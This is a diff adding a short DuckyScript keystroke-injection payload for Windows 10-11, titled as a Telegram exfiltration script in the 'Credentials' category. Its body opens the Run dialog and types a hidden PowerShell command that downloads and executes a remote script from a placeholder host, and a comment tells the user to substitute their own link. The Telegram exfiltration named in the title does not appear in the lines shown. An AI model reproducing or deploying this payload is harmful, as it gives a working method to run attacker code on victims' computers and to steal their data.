@@ -1,0 +1,17 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : Windows-System-Info-Telegram-Exfiltration        |
+REM # Author       : Droid-MAX                                        |
+REM # Description  : A script used to get target system info.         |
+REM # Category     : Credentials                                      |
+REM # Target       : Windows 10-11                                    |
+REM # Version      : 1.0                                              |
+REM #                                                                 |
+REM ###################################################################
+
+DELAY 500
+GUI r
+DELAY 250
+
+REM Reply example.com with YOUR LINK.
+STRINGLN powershell -nop -w h -c "IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
